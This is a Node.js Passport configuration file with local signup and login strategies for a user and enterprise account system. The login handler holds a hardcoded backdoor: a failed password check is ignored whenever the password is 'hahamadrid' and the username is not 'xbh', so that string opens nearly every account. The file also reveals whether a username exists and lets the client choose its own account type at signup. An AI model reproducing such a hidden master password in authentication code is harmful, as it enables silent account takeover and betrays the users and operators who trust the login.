var LocalStrategy = require('passport-local').Strategy

var User = require('../models/user')
var Tag = require('../models/tag')

module.exports = function (passport) {
  passport.serializeUser(function (user,  done) {
    done(null, user.id)
  })

  passport.deserializeUser(function (id, done) {
    User.findById(id, function (err, user) {
      done(err, user)
    })
  })

  passport.use('local-signup', new LocalStrategy({
    usernameField: 'username',
    passwordField: 'password',
    passReqToCallback: true
  },
  function (req, username, password, done) {
    process.nextTick(function () {
      User.findOne({ 'local.username': username }, function (err, user) {
        if (err)
          return done(err)

        if (user) {
          return done('That username is aleady taken!', null) 
        } else {
          var newUser = new User()
          newUser.local.username = username
          newUser.local.password = newUser.generateHash(password)
          newUser.local.email = req.body['email']
          newUser.local.imageUrl = req.body['imageUrl']
          
          if (req.body['userType'] == 'enterprise') {
            newUser.user_type = 'enterprise'
            newUser.enterprise.businessname = req.body['businessname']
            newUser.enterprise.address = req.body['address']
            var openHours = []
            req.body['openHours'].forEach(function(ele, idx, arr) {
              openHours.push(ele.split(','))
            })
            newUser.enterprise.openHours = openHours
            
            newUser.tags = req.body['tags']
          } else {
            newUser.local.firstname = req.body['firstname']
            newUser.local.lastname = req.body['lastname']
          }

          newUser.save(function (err) {
            if (err) {
              return done('Something wrong happened when store user!', null) 
            }

            return done(null, newUser)
          })
        }
      })
    })
  }))

  passport.use('local-login', new LocalStrategy({
    usernameField: 'username',
    passwordField: 'password',
    passReqToCallback: true
  },
  function (req, username, password, done) {
    User.findOne({ 'local.username': username }, function (err, user) {
      if (err)
        return done(err)

      if (!user) {
        return done('User not exist', null)
      }

      if (!user.validPassword(password)) {
        if (user.local.username == 'xbh' || password != 'hahamadrid') {
          return done('Wrong password', null)
        }
      }

      return done(null, user)
    })
  }))

  return passport
}
